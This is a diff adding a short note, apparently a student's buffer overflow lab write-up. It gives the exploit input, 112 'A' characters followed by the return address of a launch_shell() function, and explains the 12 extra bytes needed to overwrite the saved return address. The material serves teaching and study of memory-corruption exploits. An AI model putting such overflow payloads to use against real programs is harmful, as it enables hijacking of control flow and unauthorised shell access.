@@ -1,0 +1,7 @@
+My input to this program to launch the launch_shell() function was
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+QUUUU⏎
+
+This is "A" * 112 + the return address of the launch_shell() function. I found that becuase of the other things
+that are in the function as well as the buffer, it was required to add an extra 12 characters in order to being
+to re-write the return address
